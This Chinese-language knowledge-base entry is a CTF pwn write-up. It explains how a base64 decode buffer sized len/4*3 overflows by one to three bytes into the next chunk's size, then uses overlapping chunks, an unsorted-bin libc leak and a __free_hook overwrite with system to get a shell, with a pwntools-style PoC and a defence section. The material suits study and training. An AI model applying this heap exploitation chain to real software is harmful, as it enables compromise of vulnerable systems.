---
id: ctf-pwn-base64-decode-len-rounding-chunk-overlap-freehook
title: Base64 解码功能按「长度/4*3」分配但解码补全可多写 1~3 字节：改下一 chunk size 造 0x80 与 0x40 重叠，unsorted 泄 libc 后打 __free_hook
type: scenario
domain: ctf
path: ctf/pwn
technique: base64-decode-length-rounding-offby-chunk-overlap-freehook
tags:
- pwn
- heap
- base64
- off-by-one
- overlapping
- unsorted-bin
- libc-leak
- free-hook
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:25:05+08:00'
  notes: 已对照原文核对；本次核对未读取图片；decode 分配长度除以四再乘三、余数导致多写一到三字节、改 chunk size 低字节造 0x80 与两个 0x40 重叠、unsorted bin 泄露减 0x1ecf61、dele_decode 触发 __free_hook 均为原文给出；未验证点：原文关键步骤以调试截图为主，写入 size 的具体字节值与堆布局依赖实际二进制，未执行 PoC
url: /docs/ctf/pwn/ctf-pwn-base64-decode-len-rounding-chunk-overlap-freehook/
draft: false
kb_aliases:
- ez_heap
- base64 解码长度取整溢出
- decode 分配 len/4*3 多写三字节
- 改 chunk size 低字节造 overlapping
- unsorted bin 残留 fd 泄 libc
- free_hook 写 system
---

## 一句话结论

当菜单题的 encode/decode 功能用 `malloc(len/4*3)` 给 base64 解码结果分配缓冲区时，`len%4 != 0` 的输入在解码补全后会多写出 1~3 字节，落在下一个 chunk 的 `size` 字段上；把 `0x41` 改成 `0x80`（或 `0x81`）就凭空"变大"出一个 0x80 chunk 与两个 0x40 chunk 重叠，free 掉其中一个 0x40 后 fd 留在重叠区里，申请/回读 0x80 即可泄 libc，再改写 `__free_hook` 为 `system` 并 `free("/bin/sh")` 完成利用。

## 原理

- **长度换算不是解码后的真实长度**：base64 的 4 个字符产出 3 字节，代码按 `input_len / 4 * 3` 算缓冲区。`input_len % 4 != 0` 时（`a`、`aa`、`aaa` 这类补 `=` 的输入），解码器按补全规则仍会产出完整字节组，于是最多比分配的缓冲区多写 1~3 字节。
- **多写的位置正好是相邻 chunk 的头部**：堆上按顺序分配，多出的字节紧跟在返回指针之后，即下一个 chunk 的 `prev_size`/`size` 低字节。把该字节从 `0x41` 改成 `0x80`，就让这个物理 chunk 自称 0x80 大小，从而**覆盖两个 0x40 chunk**。
- **重叠加起来才有写权限**：两个 0x40 chunk 都还各自被菜单索引持有（指针保留），但它们落进了同一个 0x80 视图里；释放其中一部分再用 0x80 申请回来，就能用 0x80 的写接口修改仍被另一索引引用的 0x40 chunk 内容（tcahe/fastbin 之外的重叠写）。
- **unsorted bin 泄 libc**：把大的 chunk（本例 0x360 级别）释放进 unsorted bin，其 `fd`/`bk` 指向 `main_arena`；只要有一个"仍能读"的索引覆盖到该 chunk 的前 16 字节（重叠区），就能把 `fd` 读出来减去已知 libc 偏移得到 libc 基址。
- **收尾**：拿到 libc 后再造一次重叠，把目标 chunk 的 `fd` 写成 `__free_hook` 地址（0x40 大小对应 tcache/fastbin 的 fd 改写），申请两次拿到 `__free_hook` 处的写指针，先写 `/bin/sh` 缓冲区地址，再把 `system` 写到 `__free_hook`，最后 free 那块含 `/bin/sh` 的 chunk 触发 `system("/bin/sh")`。
- 根因是**用长度推算分配大小、却没有校验解码后的实际写入量**，且菜单允许"释放后仍保留索引"（UAF/悬垂指针），两点叠加才有任意重叠。

## 触发条件

- 二进制提供成对的 encode/decode 功能，decode 内部是 `malloc(len/4*3)` + `base64_decode`（或先申请后写）。
- 分配大小与解码写入量之间存在取整差（`len%4 != 0` 时多写 1~3 字节）。
- free 之后菜单索引不清零（悬垂指针可继续 show/read），或存在 `show` 能读被释放 chunk 的前 16 字节。
- glibc 版本仍受 `__free_hook` 支配（2.34 之前 `__free_hook` 仍会被调用；2.34+ 需换 `__exit_funcs`/IO 链）。
- 需要能泄露 libc（本例靠 unsorted bin 残留 fd + show）。

## 利用步骤

1. 逆向确认 decode 的分配表达式与写入长度上界，算出"多写几个字节"（本例最多 3）。
2. 先用正常长度铺两个 0x40 chunk（`encode('a'*0x20)` 一次、`decode('a'*0x40)` 两次），使第三个 0x40 chunk 紧跟其后。
3. 释放其中第一个（`dele_encode(0)`），此时后面两个 0x40 物理相邻。
4. 用带 `len%4 != 0` 的 decode 输入（本例 `b"a"*72 + b"A"` 或 `b"aa"*(0x38//2+8) + b"="`）把下一个 chunk 的 size 低字节改成 `0x80`，形成 0x80 与两个 0x40 的重叠视图。
5. 造一个 0x360 的大 chunk 并释放进 unsorted bin；用 `decode('YWFhYWFhYWFh')` 之类再次制造重叠，让仍被索引的 chunk 覆盖到已释放大 chunk 的前 16 字节，把里面的 `size` 低字节改回 `0x81` 便于继续使用（`encode("C"*0x360)` / `encode("C"*0x20)` / `dele_encode(0)` 顺序）。
6. `show_dec(idx)` 读出 `main_arena` 相关指针，减 libc 已知偏移得 `libc.address`。
7. 用重叠写把某 fastbin/tcache chunk 的 `fd` 指向 `libc.sym['__free_hook']`，连续申请两次拿到 `__free_hook` 处可写指针。
8. 写入 `b'/bin/sh\x00'` 到一块可控 chunk（并记住地址），再把 `system` 地址写入 `__free_hook`。
9. free 含 `/bin/sh` 的 chunk（本例 `dele_decode(1)`）触发 `system`。

## PoC

关键交互序列（pwnlib 风格，仅示意顺序，偏移/索引按实际二进制调整）：

```python
encode('a'*0x20)
decode('a'*0x40)
decode('a'*0x40)
dele_encode(0)

pl = b"aa"*(0x38//2+8) + b"="   # 长度取整差，多写的字节落在下一 chunk 的 size 上
decode(pl)

encode("C"*0x360)               # 大 chunk
encode("C"*0x20)
dele_encode(0)
decode("YWFhYWFhYWFh")          # 再次重叠，制造可读的 unsorted bin 残留

show_de(3)
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00")) - 0x1ecf61

pl = b"A"*0x38 + p64(0x41) + p64(libc.sym['__free_hook']) + p64(0)
decode(base64.b64encode(pl.ljust(0x70, b"A")))

decode(base64.b64encode((b'/bin/sh\x00').ljust(0x30, b"A")))
decode(base64.b64encode(p64(libc.sym['system']).ljust(0x30, b"A")))
dele_decode(1)
```

说明：偏移 `0x1ecf61` 是原文 libc 版本的 `main_arena` 相对偏移，换 libc 需重算；本文不执行任何二进制。

## 变体与关联

- 取整差不只出现在 base64：`len*3/4`、`(len+2)/3*4`、URL 解码后长度变大、`iconv` 转码后变长，都会给出"申请少、写入多"的 off-by-N；多写 1 字节即 off-by-null 家族，多写多字节可直接改 `size`。
- 重叠后的落点可换：`__malloc_hook`（旧 glibc）、`__free_hook`、tcache 的 `next`、stdout `_IO_FILE` 链（2.34+）。
- 关联：[[binary-pwn-heap-newline-size-diff-0xa-offbyone-prev-inuse-overlap]]（同样是"输入长度与真实写入不一致"造成的 off-by-one 重叠）、[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（拿到重叠写后的 hook 打法）、[[ctf-pwn-uaf-low4byte-next-fake-unsorted-overlap-freehook]]（同类 unsorted→overlap→free_hook 三段式）。

## 检测与防御

- 这道题属于 CTF 二进制方向，防护要点落在源码层：分配大小必须用"解码后真实长度"或先解码到受控缓冲再按实际长度 copy。
- 所有 free 之后必须把索引置空/移除，避免悬垂指针被 show 复用。
- 编译期加 `-fsanitize=address` 或堆一致性校验可提前暴露多写 1~3 字节。
- 真实产品侧同理：任何 `malloc(估计长度)` 与 `write(实际长度)` 分离的实现都要按最大膨胀率留余量（base64 → `((n+3)/4)*3`，URL 解码 → 3 倍）。
